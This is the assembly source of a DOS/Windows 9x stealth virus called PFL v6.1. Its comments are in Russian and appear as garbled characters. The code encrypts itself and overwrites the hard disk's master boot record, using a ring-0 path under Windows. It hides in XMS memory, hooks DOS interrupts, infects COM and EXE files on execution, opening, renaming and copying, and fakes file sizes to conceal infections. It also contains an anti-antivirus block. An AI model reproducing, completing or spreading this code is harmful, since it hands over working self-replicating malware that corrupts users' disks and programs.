����������������������������������������������������������������[PFL61.ASM]���
;����������������� Const ��������������������������������������������������Ŀ
;������ ��p�� � �����                                                    ;�
length_of_virus_in_bate=(endvirus-virus)                                   ;�
;������ ��p�� � ����� �p�⭠� ���                                       ;�
length_of_virus_in_bate_multiple_two=((endvirus-virus)/2)*2+2              ;�
;������ ��p�� � ᥪ�p��                                                  ;�
length_of_virus_in_sector=(length_of_virus_in_bate)/200h+1                 ;�
;������ ��p�� �� 䠩�� �� ���뢠� file_align                             ;�
length_virus_on_file=(endvirus-virus+length_of_antivirus_break_block)      ;�
;������ ���p� �������� (08h - �������)                                  ;�
symbol_to_show = 08h                                                       ;�
;����������������������������������������������������������������������������
locals
.386p
seg_a   segment  byte public use16
        assume   cs:seg_a, ds:seg_a
        org      100h
pfl     proc far
start:
;�������������������������� ANTIVIRUS BREAK ���������������������������������
;H� p���쭮� ��p������� 䠩�� ᤥ�� ���� p�ᯮ�������� ANTIVIRUS'��
;�p直 (�窨 �� ��⠭���)
        pusha
        push     ds es
        mov      ah,2
        mov      dl,symbol_to_show
        int      21h
;�������������������������� VIRUS ENTRYPOINT ��������������������������������
;�᫨ �� �室� DX = 'DK', � ���� �pאַ �� ��p����� 䠩�
virus:  ; � ����� ��⪠ VIRUS ������ ��室���� �� ��p��� cs:0
        call     init_virus
init_virus:
        pop      bp
        sub      bp,offset(init_virus-virus)
        ;�����p��騪
        db       0B0h ;MOV AL,0
crypt_byte:
        db       0
        mov      cx,offset(end_crypt-begin_crypt)
        lea      si,[bp+begin_crypt-virus]
encrypt_virus:
        xor      cs:[si],al
        inc      si
        loop     encrypt_virus
begin_crypt:
        jmp      goto_virus
;������������������������������� MANAGER ������������������������������������
;��p�� ��宦����� MANAGER'� � �����
M_ADDR = 0240h
;������� ��p��
virus_segment = 0BC00h
;����������������������������������������������������������������������������
begin_manager:
        dw       31F5h
manager_int21_processing:
        pushf
        pusha
        push     ds es
        cld
        push     0000h
        pop      ds
        push     virus_segment
        pop      es
        cmp      ax,2521h
        jz       exit_manager
        cmp      byte ptr ds:[0449h],3
        ja       exit_manager
        ;�஢�ਬ ����稥 ����� � �����
        call     check_virus_present
        jnc      detected_virus_in_memory
        cmp      byte ptr ds:[M_ADDR+virus_in_xms_flag-begin_manager],1
        jz       load_virus_via_HIMEM
        call     load_virus_via_int13
        call     check_virus_present
        jc       exit_load_virus
        ;�p���p�� �p�����⢨� HIMEM
        mov      ax,4300h
        int      2Fh
        cmp      al,80h
        jnz      exit_manager
        push     es
        mov      ax,4310h
        int      2Fh
        mov      word ptr ds:[M_ADDR+himem_entrypoint-begin_manager],bx
        mov      word ptr ds:[M_ADDR+himem_entrypoint-begin_manager+2],es
        pop      es
        ;�뤥�塞 20 �������� �����
        mov      ah,9
        mov      dx,20
        call     call_himem
        cmp      ax,1
        jnz      exit_load_virus
        ;��室: DX - HANDLE
        mov      ds:[M_ADDR+handle_destination_1-begin_manager],dx
        mov      ds:[M_ADDR+handle_source_2-begin_manager],dx
        mov      si,offset(M_ADDR+copy_to_xms-begin_manager)
        mov      ah,0Bh ;����p����� � XMS
        call     call_himem
        cmp      ax,1
        jnz      exit_load_virus
        mov      byte ptr ds:[M_ADDR+virus_in_xms_flag-begin_manager],1
load_virus_via_HIMEM:
        mov      si,offset(M_ADDR+copy_from_xms-begin_manager)
        mov      ah,0Bh
        call     call_himem
exit_load_virus:
        jmp      exit_manager
detected_virus_in_memory:
        ;��।�� �ࠢ����� ������
        lds      ax,ds:[M_ADDR+old_int21_vector_in_manager-begin_manager]
        mov      es:[place_of_int21-virus],ax
        mov      es:[place_of_int21-virus+2],ds
        pop      es ds
        popa
        popf
        db       0eah
        dw       offset(virus_int21_processing-virus)
        dw       virus_segment
exit_manager:
        pop      es ds
        popa
        popf
        db       0eah
old_int21_vector_in_manager:
        dd       00000000h
;����������������������������������������������������������������������������
check_virus_present:
        pusha
        mov      si,offset(begin_solve_crc-virus)
        mov      cx,offset(end_solve_crc-begin_solve_crc-1)
        xor      ax,ax
        xor      dx,dx
solve_crc:
        add      ax,es:[si]
        jnc      not_carry_1
        inc      dx
not_carry_1:
        inc      si
        loop     solve_crc
        cmp      ax,0A1CAh
        stc
        jnz      exit_check_virus_present
        cmp      dx,29h
        stc
        jnz      exit_check_virus_present
        clc
exit_check_virus_present:
        popa
        retn
;����������������������������������������������������������������������������
load_virus_via_int13:
        xor      bx,bx
        mov      ah,02h                       ;����� ᥪ�p�
        mov      al,length_of_virus_in_sector ;����쪮 ����
        mov      dx,0080h                     ;0 �������
        mov      cx,0003h                     ;0 樫���p 3 ᥪ�p
        int      13h
        retn
;����������������������������������������������������������������������������
call_himem:
        db       09Ah
himem_entrypoint:
        dd       ?
        retn
;�������������������������� DATA IN MANAGER ���������������������������������
copy_to_xms:
        length_of_block_1    dd length_of_virus_in_bate_multiple_two
        handle_source_1      dw 0
        offset_source_1      dw 0,virus_segment
        handle_destination_1 dw 0  ; HANDLE IN XMS
        offset_destination_1 dd 0
copy_from_xms:
        length_of_block_2    dd length_of_virus_in_bate_multiple_two
        handle_source_2      dw 0  ; HANDLE IN XMS
        offset_source_2      dd 0
        handle_destination_2 dw 0
        offset_destination_2 dw 0,virus_segment
manager_idle_flag            db 0h ;1 MANAGER �몫�祭
virus_in_xms_flag            db 0h ;1 ��p�᭮� ⥫� ��室���� � XMS
hooked_win_int21_flag        db 0h ;1 ��p�墠祭 WIN_INT21
entry_manager:
        db       0EAh
hooked_win_int21:
        dd       ?
;����������������������������������������������������������������������������
manager_int8_procesing:
        pusha
        push     ds es
        push     0000h
        pop      ds
        mov      ax,ds:[21h*4+2]
        cmp      byte ptr ds:[M_ADDR+wait_next_int21_flag-begin_manager],1
        jz       check_next_int21
        cmp      ax,0800h
        ja       exit_int8_procesing
        mov      byte ptr ds:[M_ADDR+wait_next_int21_flag-begin_manager],1
        mov      ds:[M_ADDR+dos_int21_seg-begin_manager],ax
check_next_int21:
        cmp      ax,ds:[M_ADDR+dos_int21_seg-begin_manager]
        jz       exit_int8_procesing
        ;��⠭�������� ᢮� INT 21
        call     install_int21
        cli
        les      bx,ds:[M_ADDR+old_int8_vector_in_manager-begin_manager]
        mov      ds:[8*4],bx
        mov      ds:[8*4+2],es
exit_int8_procesing:
        pop      es ds
        popa
        db       0eah
old_int8_vector_in_manager:
        dd       0
dos_int21_seg        dw 0
wait_next_int21_flag db 0 ;1 ���� ᫥���饣� ���� ��� ��p����稪�
;����������������������������������������������������������������������������
;�室: DS=0
install_int21:
        les      bx,ds:[21h*4]
        mov      ds:[M_ADDR+old_int21_vector_in_manager-begin_manager],bx
        mov      ds:[M_ADDR+old_int21_vector_in_manager-begin_manager+2],es
        mov      byte ptr ds:[M_ADDR+virus_in_xms_flag-begin_manager],0
        mov      byte ptr ds:[M_ADDR+hooked_win_int21_flag-begin_manager],0
        mov      dx,offset(M_ADDR+manager_int21_processing-begin_manager)
        mov      ax,2521h
        int      21h
        retn
;����������������������������������������������������������������������������
end_manager:
;������������������������������ BOOT ����������������������������������������
begin_mbr:
        xor      bx,bx
        cli
        mov      sp,7c00h
        mov      ss,bx
        sti
        jmp      jump_version
check_mbr:
        ;��⪠ ��� p�ᯮ�������� ���� �� �� 㦥 �� MBR
        dw       31F5h
        db       61h ;��p�� ��p�� v6.1
jump_version:
        push     virus_segment
        pop      es
        ;��⠥� ��p�� � ����� ���p BC00:0000
        mov      ah,02    ;����� ᥪ�p�
        mov      al,length_of_virus_in_sector
        mov      dx,0080h ;0 �������
        mov      cx,0003h ;0 樫���p 3 ᥪ�p
        int      13h
        push     es
        mov      ax,offset(after_mbr-virus)
        push     ax
        retf
end_mbr:
;���������������������������� AFTER BOOT ������������������������������������
;H� �室� � AFTER MBR: ES=BC00h=CS
after_mbr:
        ;�����⠢������ manager
        push     0000h
        pop      es
        mov      word ptr es:[21h*4+2],0801h
        push     cs
        pop      ds
        mov      si,offset(begin_manager-virus)
        mov      di,M_ADDR
        mov      cx,offset(end_manager-begin_manager)
;�訡�� �᫨ ࠧ��� Manager'� ����� 祬 ����
.errnz  offset(end_manager-begin_manager) GT (400h-M_ADDR)
        rep      movsb      ; DS:[SI] -> ES:[DI]
        ;��⠭�������� MANAGER_INT8_PROCESSING
        lds      bx,es:[8h*4]
        mov      es:[M_ADDR+old_int8_vector_in_manager-begin_manager],bx
        mov      es:[M_ADDR+old_int8_vector_in_manager-begin_manager+2],ds
        mov      byte ptr ds:[M_ADDR+wait_next_int21_flag-begin_manager],0
        cli
        mov      bx,offset(M_ADDR+manager_int8_procesing-begin_manager)
        mov      es:[8*4],bx
        mov      word ptr es:[8*4+2],0
        sti
        ;��⠥� �ਣ������ MBR � ��।��� ��� �ࠢ�����
        mov      ax,0201h ;����� ���� ᥪ�p
        mov      bx,7C00h
        mov      dx,0080h ;0 �������
        mov      cx,0002h ;0 樫���p 2 ᥪ�p
        int      13h ;��⠥� �p�������� MBR �� ��p��� 0:7C00h
        push     es
        push     bx
        retf
;������������������ VIRUS ENTRYPOINT AFTER ENCRYPT ��������������������������
;����������������� Data section ���������������������������������Ŀ
NT_label  db 10,'Windows*NT'                                     ;�
;������������������������������������������������������������������
call_int_13:
        push     ds
        push     0000h
        pop      ds
        pushf
        call     dword ptr ds:[13h*4]
        pop      ds
        retn
;����������������������������������������������������������������������������
;�⥪:  PUSHA
;       PUSH     DS ES
goto_virus:
        push     cs
        pop      ds
        ;�p���p塞 �� ���⮫��p
        cmp      bx,'DK'
        jz       GATE1_goto_normal_programm ;���⮫��p ��� �����, �� ��p����� ���� p���
        ;�p���p�� ����� �� ��� NT ᨤ��
        mov      ah,62h
        int      21h
        mov      es,bx
        mov      es,es:[002Ch]
        xor      di,di     ;ES:DI = 0:0 - �� �㤠 ����� ᪠��p������ �����
        mov      cx,200h   ;����쪮 ᪠��p�����
        mov      bx,1h     ;��� ᪠��p������ p���� 1'�
        lea      si,[bp+NT_label-virus]
        call     scan_mem_call
        jc       GATE1_goto_normal_programm ;����p㦨�� Windows NT
        mov      byte ptr ds:[bp+filename-virus],0
        lea      bx,[bp+endvirus-virus]
        mov      di,bx                      ;�㤠 MBR ������ ���� �p��⠭
        call     check_windows_present
        jc       DOS_MBR_readed
        inc      byte ptr ds:[bp+filename-virus]
        ;ES=CS ��⠭����� check_windows_present
        mov      cx,0001h                   ; ���=1 ���=0
        mov      dx,0080h                   ; ���=0 ����
        mov      ax,0201h
        call     call_int_13
        jc       GATE1_goto_normal_programm
DOS_MBR_readed:
        cmp      word ptr es:[bx+check_mbr-begin_mbr],31F5h
        jnz      write_virus_to_mbr
        cmp      byte ptr es:[bx+check_mbr-begin_mbr+2],61h
        jz       write_memory
GATE1_goto_normal_programm:
        jmp      goto_normal_programm
write_virus_to_mbr:
        mov      ah,08h
        mov      dl,80h
        call     call_int_13
        jc       GATE1_goto_normal_programm
        and      cl,00111111B  ;CL-���ᨬ���� ����� ᥪ��, ��p�� ��� ��� �� �� ������p�
                               ;�H-���ᨬ���� ����� 樫����
                               ;DH-���ᨬ���� ����� �������, ��p�� ��� ��� �� �� ������p�
        cmp      cl,1+1+length_of_virus_in_sector+1
        ;1(MBR)+1(OLD_MBR)+(������ ��p�� � ᥪ�p��)+1(RESERVED)
        jc       GATE1_goto_normal_programm
        ;�����뢠�� �ਣ������ MBR �� ᥪ��
        mov      ax,0301h
        mov      dx,0080h ;0 �������
        mov      cx,0002h ;0 樫���p 2 ᥪ�p (ᤥ�� �� �p���� �p�������� MBR)
        call     call_int_13
        jc       GATE1_goto_normal_programm
        ;��襬 ⥫� ��p�� �� ���.
        mov      ah,03h
        ;����쪮 ᥪ�p�� �������� ��p��
        mov      al,length_of_virus_in_sector
        mov      bx,bp
        inc      cx       ;0 樫���p 3 ᥪ�p (ᤥ�� �� �p���� ⥫� ��p��)
        call     call_int_13
        jc       goto_normal_programm
        ;��p���ᨬ ���� MBR'��� ���� � �孨� MBR
        lea      si,[bp+begin_mbr-virus]   ;���� MBR-��� ��� �����.
        lea      di,[bp+endvirus-virus]    ;���� ��� �ਣ. MBR ᥩ�� ��室����
        mov      cx,offset(end_mbr-begin_mbr)
        rep      movsb                     ;����ᨬ � �ਣ. MBR ���.
        ;��襬�� �� MBR
        cmp      byte ptr ds:[bp+filename-virus],0
        jz       DOS_MBR_write
        call     prepare_to_protect_mode
        jc       GATE1_goto_normal_programm
        ;��p�室�� � ���饭�� p����
        ;H� �室� �p������ ES - �p����� ᥣ���� ��� DPMI
        mov      ax,cs
        add      ax,0500h
        mov      es,ax
        mov      ax,1
        call     DPMI_call
        jc       GATE1_goto_normal_programm
        push     ds
        pop      es
        call     open_RING0_16prot_function
        lea      di,[bp+write_MBR_call-virus]
        call     RING0_16prot_function
        call     close_RING0_16prot_function
        call     back_to_real
        jmp      write_memory
DOS_MBR_write:
        call     write_MBR_call
;���������������������������� MEMORY WRITE ����������������������������������
write_memory:
        push     0000h
        pop      ds
        cmp      word ptr ds:[M_ADDR],31F5h
        jz       manager_present
        push     0000h
        pop      es
        push     cs
        pop      ds
        lea      si,[bp+begin_manager-virus]
        mov      di,M_ADDR
        mov      cx,offset(end_manager-begin_manager)
        rep      movsb      ; DS:[SI] -> ES:[DI]
        push     0000h
        pop      ds
        call     install_int21
        jmp      goto_normal_programm
manager_present:
        cmp      byte ptr ds:[M_ADDR+manager_idle_flag-begin_manager],1h
        jnz      goto_normal_programm
        mov      byte ptr ds:[M_ADDR+manager_idle_flag-begin_manager],0
        call     install_int21
;������������������������ GO TO NORMAL PROGRAMM �����������������������������
goto_normal_programm:
        push     cs
        pop      ds
        cmp      byte ptr ds:[bp+extention-virus],2    ;EXE 䠩�
        jz       itis_EXE_file
;��������������������������������� COM ��������������������������������������
        pop      es ds
        lea      si,[bp+old_first_20_byte-virus]
        mov      di,100h
        mov      cx,20h
        rep      movsb   ;DS:[SI] -> ES:[DI]
        call     turnoff_A20
        popa
        push     0100h
        retn
;����������������������������������������������������������������������������
itis_EXE_file:
        pop      es
        mov      bx,es
        add      bx,0010h
        add      ds:[bp+old_first_20_byte-virus+16h],bx     ;Relo CS
        add      ds:[bp+old_first_20_byte-virus+0eh],bx     ;Relo SS
        add      word ptr ds:[bp+sp_correct-virus],bp
        add      word ptr ds:[bp+ss_correct-virus],bp
        add      word ptr ds:[bp+jump_correct-virus],bp
        call     turnoff_A20
        pop      ds
        popa
        cli
        db       02Eh,08Bh,26h   ;��V SP,CS:[XXXX]
sp_correct:
        dw       offset(old_first_20_byte-virus+10h)
        db       02Eh,08Eh,16h   ;��V SP,CS:[XXXX]
ss_correct:
        dw       offset(old_first_20_byte-virus+0Eh)
        sti
jump_to_normal_programm:
        db       02Eh,0FFh,02Eh ;JMP DWORD PTR CS:[]
jump_correct:
        dw       offset(old_first_20_byte-virus+14h)
;����������������������������������������������������������������������������
turnoff_A20:
        mov      ax,4300h
        int      2Fh
        cmp      al,80h
        jnz      exit_turnoff_A20
        push     es
        mov      ax,4310h
        int      2Fh
        mov      ds:[bp+himem_entrypoint-virus],bx
        mov      ds:[bp+himem_entrypoint-virus+2],es
        mov      ah,06h
        call     call_himem
        pop      es
exit_turnoff_A20:
        retn
;������������������������ INT 21 PROCESSING ���������������������������������
virus_int21_processing:
        pushf
        cld
        cmp      ah,4Eh
        jnz      next_step_1
;��������������������������������������������������������������������������Ŀ
;����� - ��p����� ���� �� �᪠���� 䠩���                                 �
;DS:DX - ����                                                              ;�
        pusha                                                              ;�
        push     es                                                        ;�
        mov      si,dx                                                     ;�
        push     cs                                                        ;�
        pop      es                                                        ;�
        mov      di,offset(path_for_4F_function-virus)                     ;�
        mov      cx,80h                                                    ;�
        rep      movsb ;DS:SI -> ES:DI                                     ;�
        pop      es                                                        ;�
        popa                                                               ;�
        jmp      function_4E_4F                                            ;�
;����������������������������������������������������������������������������
next_step_1:
        cmp      ah,4Fh
        jnz      next_step_2
;��������������������������������������������������������������������������Ŀ
;��p뢠�� ������, �� ��� �㭪権 4E � 4F.                                 ;�
function_4E_4F:                                                            ;�
        push     bx es ax                                                  ;�
        mov      ah,2Fh                                                    ;�
        call     call_int21                                                ;�
        ;��室: ES:BX - ��p��� DTA                                         ;�
        pop      ax                                                        ;�
        call     call_int21                                                ;�
        jc       exit_stc_stealth                                          ;�
        pusha                                                              ;�
        push     ds es                                                     ;�
        mov      ax,es:[bx+1Ah]                                            ;�
        mov      dx,es:[bx+1Ah+2]                                          ;�
        call     q_file_infected                                           ;�
        jc       exit_clc_stealth                                          ;�
        push     cs                                                        ;�
        pop      ds                                                        ;�
        mov      dx,offset(path_for_4F_function-virus)                     ;�
        call     seach_name_from_path                                      ;�
        mov      di,dx                                                     ;�
        lea      si,[bx+1Eh] ;��� 䠩��                                    ;�
        push     ds es                                                     ;�
        pop      ds es                                                     ;�
        mov      cx,20h                                                    ;�
        rep      movsb  ;DS:SI -> ES:DI                                    ;�
        push     ds es                                                     ;�
        pop      ds es                                                     ;�
        mov      dx,offset(path_for_4F_function-virus)                     ;�
        call     return_original_size_of_file                              ;�
        jc       exit_clc_stealth                                          ;�
        mov      es:[bx+1Ah],ax                                            ;�
        mov      es:[bx+1Ah+2],dx                                          ;�
exit_clc_stealth:                                                          ;�
        pop      es ds                                                     ;�   ;�
        popa                                                               ;�
        pop      es bx                                                     ;�
        popf                                                               ;�
        clc                                                                ;�
        retf     2                                                         ;�
exit_stc_stealth:                                                          ;�
        pop      es bx                                                     ;�
        popf                                                               ;�
        stc                                                                ;�
        retf     2                                                         ;�
;����������������������������������������������������������������������������
next_step_2:
        cmp      ax,714Eh
        jnz      next_step_3
;��������������������������������������������������������������������������Ŀ
;����� - ��p����� ���� �� �᪠���� 䠩���                                 �
;DS:DX - ����                                                              ;�
        pusha                                                              ;�
        push     es                                                        ;�
        mov      si,dx                                                     ;�
        push     cs                                                        ;�
        pop      es                                                        ;�
        mov      di,offset(path_for_714F_function-virus)                   ;�
        mov      cx,80h                                                    ;�
        rep      movsb ;DS:SI -> ES:DI                                     ;�
        pop      es                                                        ;�
        popa                                                               ;�
        jmp      function_714E_714F                                        ;�
;����������������������������������������������������������������������������
next_step_3:
        cmp      ax,714Fh
        jnz      next_step_4
;��������������������������������������������������������������������������Ŀ
function_714E_714F:                                                        ;�
        call     call_int21                                                ;�
        jc       exit_stc_stealth_714F                                     ;�
        ;ES:DI - ��p���p� ������                                          ;�
        pusha                                                              ;�
        push     ds es                                                     ;�
        mov      bx,di                                                     ;�
        mov      ax,es:[bx+20h]                                            ;�
        mov      dx,es:[bx+20h+2]                                          ;�
        call     q_file_infected                                           ;�
        jc       exit_clc_stealth_714E_714F                                ;�
        push     cs                                                        ;�
        pop      ds                                                        ;�
        mov      dx,offset(path_for_714F_function-virus)                   ;�
        call     seach_name_from_path                                      ;�
        mov      di,dx                                                     ;�
        lea      si,[bx+2Ch] ;��� 䠩��                                    ;�
        push     ds es                                                     ;�
        pop      ds es                                                     ;�
        mov      cx,20h                                                    ;�
        rep      movsb  ;DS:SI -> ES:DI                                    ;�
        push     ds es                                                     ;�
        pop      ds es                                                     ;�
        mov      dx,offset(path_for_714F_function-virus)                   ;�
        call     return_original_size_of_file                              ;�
        jc       exit_clc_stealth_714E_714F                                ;�
        mov      es:[bx+20h],ax                                            ;�
        mov      es:[bx+20h+2],dx                                          ;�
exit_clc_stealth_714E_714F:                                                ;�
        pop      es ds                                                     ;�
        popa                                                               ;�
        popf                                                               ;�
        clc                                                                ;�
        retf     2                                                         ;�
exit_stc_stealth_714F:                                                     ;�
        popf                                                               ;�
        stc                                                                ;�
        retf     2                                                         ;�
;����������������������������������������������������������������������������
next_step_4:
        cmp      ah,3Ch
        jz       function_3B_5C
        cmp      ah,5Bh
        jnz      next_step_5
;��������������������������������������������������������������������������Ŀ
;DS:DX - ��� 䠩��                                                         ;�
function_3B_5C:                                                            ;�
        call     call_int21                                                ;�
        jc       exit_stc_function_3B_5C                                   ;�
        pusha                                                              ;�
        push     es                                                        ;�
        mov      si,dx                                                     ;�
        push     cs                                                        ;�
        pop      es                                                        ;�
        mov      di,offset(infect_after_copy_1-virus)                      ;�
        add      di,2h                                                     ;�
        mov      cx,80h                                                    ;�
        rep      movsb  ;DS:SI -> ES:DI                                    ;�
        mov      cs:[di],ax ;HANDLE ����p㥬��� 䠩��                      ;�
        pop      es                                                        ;�
        popa                                                               ;�
        popf                                                               ;�
        clc                                                                ;�
        retf     2                                                         ;�
exit_stc_function_3B_5C:                                                   ;�
        popf                                                               ;�
        stc                                                                ;�
        retf     2                                                         ;�
;����������������������������������������������������������������������������
next_step_5:
        cmp      ax,4202h
        jnz      next_step_6
;��������������������������������������������������������������������������Ŀ
;��⠭����� 㪠��⥫� 䠩�� �� ����� + CX:DX                               ;�
        call     select_stealth_handle                                     ;�
        jc       GATE1_set_old_int_24_jmpint21                             ;�
        push     cx si                                                     ;�
        mov      si,cs:[pointer_to_active_stealth_buffer-virus]            ;�
        add      dx,word ptr cs:[si+original_size_of_infected_file]        ;�
        adc      cx,0                                                      ;�
        add      cx,word ptr cs:[si+original_size_of_infected_file+2]      ;�
        mov      ax,4200h                                                  ;�
        call     call_int21                                                ;�
        pop      si cx                                                     ;�
        popf                                                               ;�
        clc                                                                ;�
        retf     2                                                         ;�
;����������������������������������������������������������������������������
next_step_6:
        cmp      ah,3Fh
        jnz      next_step_7
;��������������������������������������������������������������������������Ŀ
;����� 䠩�                                                               ;�
        call     select_stealth_handle                                     ;�
GATE1_set_old_int_24_jmpint21:                                             ;�
        jc       GATE2_set_old_int_24_jmpint21                             ;�
        pusha                                                              ;�
        push     cx                                                        ;�
        ;����⠥� ᪮�쪮 ����� �p����� �� 䠩��                        ;�
        mov      cs:[place_of_handle-virus+1],bx                           ;�
        call     set_lseek_current                                         ;�
        mov      si,cs:[pointer_to_active_stealth_buffer-virus]            ;�
        mov      cx,word ptr cs:[si+original_size_of_infected_file]        ;�
        mov      bx,word ptr cs:[si+original_size_of_infected_file+2]      ;�
        ;BX.CX - �p������쭠� ������ ��p�������� 䠩��                     ;�
        ;DX.AX - Current LSEEK                                             ;�
        sub      bx,dx                                                     ;�
        jc       lseek_biger                                               ;�
        sub      cx,ax                                                     ;�
        sbb      bx,0                                                      ;�
        jnc      lseek_no_biger                                            ;�
lseek_biger:                                                               ;�
        pop      ax                                                        ;�
        xor      ax,ax                                                     ;�
        jmp      read_file_3D                                              ;�
lseek_no_biger:                                                            ;�
        or       bx,bx                                                     ;�
        jz       check_smallers                                            ;�
        pop      ax                                                        ;�
        jmp      read_file_3D                                              ;�
check_smallers:                                                            ;�
        ;CX - ������⢮ ���� ���p�� �������� �p�����                   ;�
        pop      ax ;������⢮ ���� ���p�� ���� �p�����               ;�
        cmp      ax,cx                                                     ;�
        jbe      read_file_3D                                              ;�
        mov      ax,cx                                                     ;�
read_file_3D:                                                              ;�
        mov      cs:[real_number_of_readed_bate-virus],ax                  ;�
        popa                                                               ;�
        call     set_old_int24 ; �⠢�� ��p�� 24'�� ���뢠���            ;�
        xchg     cx,cs:[real_number_of_readed_bate-virus]                  ;�
        call     call_int21                                                ;�
        jc       exit_stc_read_file_3D                                     ;�
        xchg     cx,cs:[real_number_of_readed_bate-virus]                  ;�
        call     move_faked_bytes                                          ;�
        popf                                                               ;�
        clc                                                                ;�
        retf     2                                                         ;�
exit_stc_read_file_3D:                                                     ;�
        popf                                                               ;�
        stc                                                                ;�
        retf     2                                                         ;�
;����������������������������������������������������������������������������
next_step_7:
        call     set_our_int24  ; �⠢�� ��� 24 ���뢠���
        cmp      ax,4b00h       ; �믮����� 䠩�
        jnz      next_step_8
;��������������������������������������������������������������������������Ŀ
;����p������ �p� ����᪥                                                 ;�
        call     install_int21_hook                                        ;�
        call     Asciiz                                                    ;�
        call     may_infect_this_file                                      ;�
        jc       check_anti_mem                                            ;�
        call     call_zaraza                                               ;�
GATE2_set_old_int_24_jmpint21:                                             ;�
        jmp      set_old_int_24_jmpint21                                   ;�
check_anti_mem:                                                            ;�
        cmp      byte ptr cs:[filename-virus],6                            ;�
        jz       anti_mem                                                  ;�
        cmp      byte ptr cs:[filemask-virus],2                            ;�
        jz       anti_mem                                                  ;�
        cmp      byte ptr cs:[filemask-virus],3                            ;�
        jz       anti_mem                                                  ;�
        cmp      byte ptr cs:[filemask-virus],4                            ;�
        jz       anti_mem                                                  ;�
        jmp      GATE2_set_old_int_24_jmpint21                             ;�
;����������������������������������������������������������������������������
next_step_8:
        cmp      ah,3Dh ;��p�⨥ 䠩��
        jnz      next_step_9
;��������������������������������������������������������������������������Ŀ
;DS:DX - ��� 䠩��                                                         ;�
        call     valid_stealth_handles                                     ;�
        call     asciiz                                                    ;�
        call     may_infect_this_file                                      ;�
        jc       infect_not_allowed                                        ;�
        call     call_zaraza                                               ;�
infect_not_allowed:                                                        ;�
        call     asciiz                                                    ;�
        cmp      byte ptr cs:[filemask-virus],1                            ;�
        jnz      set_old_int_24_jmpint21                                   ;�
        ;��p����뢠�� ⮫쪮 ��p������ 䠩��                              ;�
        call     select_stealth_field                                      ;�
        ;��室: CF=0, ES:BX - ��������� ����                               ;�
        ;       CF=1, ��� ����� ᢮������                                  ;�
        jc       set_old_int_24_jmpint21                                   ;�
        call     fill_stealth_field                                        ;�
        jc       set_old_int_24_jmpint21                                   ;�
        call     set_old_int24 ; �⠢�� ��p�� 24'�� ���뢠���            ;�
        popf                                                               ;�
        call     call_int21                                                ;�
        push     si                                                        ;�
        mov      si,cs:[pointer_to_active_stealth_buffer-virus]            ;�
        mov      cs:[si],ax                                                ;�
        pop      si                                                        ;�
        retf     0002                                                      ;�
;����������������������������������������������������������������������������
next_step_9:
        cmp      ah,56h     ;��p���������� ��p������� 䠩�
        jz       infected_fnc21
        cmp      ah,43h     ;��p�� ��p���� 䠩��
        jnz      next_step_10
;��������������������������������������������������������������������������Ŀ
;��p����������/��p������� 䠩�                                            ;�
;���p�� ��p���� 䠩��                                                     ;�
infected_fnc21:                                                            ;�
        call     Asciiz                                                    ;�
        call     may_infect_this_file                                      ;�
        jc       set_old_int_24_jmpint21                                   ;�
        call     call_zaraza                                               ;�
        jmp      set_old_int_24_jmpint21                                   ;�
;����������������������������������������������������������������������������
next_step_10:
        cmp      ah,3Eh
        jnz      set_old_int_24_jmpint21
;��������������������������������������������������������������������������Ŀ
;��p������ ��᫥ ����p������                                               ;�
        call     select_stealth_handle                                     ;�
        jc       check_after_copy_file                                     ;�
        push     si                                                        ;�
        mov      si,cs:[pointer_to_active_stealth_buffer-virus]            ;�
        mov      word ptr cs:[si],0                                        ;�
        pop      si                                                        ;�
        jmp      set_old_int_24_jmpint21                                   ;�
check_after_copy_file:                                                     ;�
        cmp      word ptr cs:[infect_after_copy_1-virus],bx                ;�
        jnz      set_old_int_24_jmpint21                                   ;�
        call     call_int21                                                ;�
        jc       exit_stc_function_3E                                      ;�
        pusha                                                              ;�
        push     ds                                                        ;�
        push     cs                                                        ;�
        pop      ds                                                        ;�
        mov      dx,offset(infect_after_copy_1-virus+2)                    ;�
        call     asciiz                                                    ;�
        call     may_infect_this_file                                      ;�
        jc       exit_clc_infect_after_copy                                ;�
        call     call_zaraza                                               ;�
exit_clc_infect_after_copy:                                                ;�
        call     set_old_int24 ; �⠢�� ��p�� 24'�� ���뢠���            ;�
        pop      ds                                                        ;�
        popa                                                               ;�
        popf                                                               ;�
        clc                                                                ;�
        retf     2                                                         ;�
exit_stc_function_3E:                                                      ;�
        call     set_old_int24 ; �⠢�� ��p�� 24'�� ���뢠���            ;�
        popf                                                               ;�
        stc                                                                ;�
        retf     2                                                         ;�
;����������������������������������������������������������������������������
set_old_int_24_jmpint21:
        call     set_old_int24 ; �⠢�� ��p�� 24'�� ���뢠���
        ;� �⥪� FLAGS
exit_int21_processing:
        popf
        jmp      dword ptr cs:[place_of_int21-virus]
;������������������������������� ZARAZA �������������������������������������
call_zaraza:
        pusha
        push     ds es
        ;��p�� ��p����� 䠩��
        mov      ax,4300h
        call     call_int21
        jc       error_occurred_zaraza
        ;��室:  CX - ��p����
        mov      cs:[attribute_of_file-virus],cx
        mov      ax,4301h
        xor      cx,cx
        call     call_int21
        jc       error_occurred_zaraza
        ;���堫� ��p�����
        mov      ax,3D02h ;��p��� 䠩� ��� �⥭��/�����
        call     call_int21
        jc       cannot_take_handle
        mov      cs:[place_of_handle-virus+1],ax
        ;��p�� ����/�p��� ᮧ����� 䠩��
        mov      bx,ax
        mov      ax,5700h
        call     call_int21
        jc       close_file_exit_zaraza
        ;��室:  CX - �p���
        ;        DX - ���
        mov      cs:[time_of_file-virus],cx
        mov      cs:[date_of_file-virus],dx
        call     common_infected
        ;�⠢�� ��p�� ����/�p��� ᮧ����� 䠩��
        mov      bx,cs:[place_of_handle-virus+1]
        mov      ax,5701h
        db       0B9h ;MOV CX,XXXXh
time_of_file:
        dw       0
        db       0BAh ;MOV DX,XXXXh
date_of_file:
        dw       0
        call     call_int21
close_file_exit_zaraza:
        call     close_file
cannot_take_handle:
        ;�⠢�� ��p� ��p���� 䠩��
        mov      ax,4301h
        db       0B9h ;MOV CX,XXXXh
attribute_of_file:
        dw       0
        call     call_int21
error_occurred_zaraza:
        pop      es ds
        popa
        retn
;����������������������������������������������������������������������������
common_infected:
        pusha
        push     ds es
        mov      bp,sp
        call     set_dses_cs
        call     set_lseek_begin       ;��砥� 20h ��p��� ���� � OLD ���p
        mov      cx,20h
        mov      dx,offset(old_first_20_byte-virus)
        call     read_file
        jc       infect_error
        cmp      ax,cx
        jnz      infect_error
        ;��p��뫠�� �� ᮤ�p����� OLD � NEW
        mov      si,dx
        mov      di,offset(new_first_20_byte-virus)
        rep      movsb ;DS:[SI] -> ES:[DI]
        mov      bx,dx
        cmp      word ptr [bx],'ZM'
